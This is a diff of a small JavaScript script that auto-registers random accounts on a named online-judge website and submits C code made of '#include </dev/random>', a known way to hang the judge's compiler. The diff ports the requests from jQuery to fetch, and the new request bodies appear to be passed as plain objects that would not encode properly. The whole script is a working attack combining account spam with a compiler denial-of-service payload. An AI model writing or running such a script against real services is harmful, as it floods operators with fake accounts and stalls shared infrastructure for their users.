@@ -1,23 +1,25 @@
 let uid = 'Test' + Math.random().toString().replace(/\D/img, '').substr(0, 20)
+let password = 'Asswecan'
 let code = `#include </dev/random>`
-var register = function () {
-  $.post('http://www.lydsy.com/JudgeOnline/register.php', {
-    user_id: uid,
-    password: 'Asswecan',
-    rptpassword: 'Asswecan'
-  }, submit)
+var register = function (callback) {
+  fetch('https://www.lydsy.com/JudgeOnline/register.php', {
+    method: 'POST',
+    body: {
+      user_id: uid,
+      password: password,
+      rptpassword: password
+    }
+  }).then(callback)
 }
 var submit = function () {
-  $.post('http://www.lydsy.com/JudgeOnline/submit.php', {
-    id: 1000,
-    language: 1,
-    source: code
-  }, function (data) {
-    console.log(data)
-  })
+  fetch('http://www.lydsy.com/JudgeOnline/submit.php', {
+    method: 'POST',
+    body: {
+      id: 1000,
+      language: 1,
+      source: code
+    }
+  }).then(() => alert('代码已提交'))
 }
-let k = document.createElement('script')
-k.src = 'https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js'
-document.head.appendChild(k)
-setTimeout(register, 1000)
+setTimeout(register, 0, submit)
 
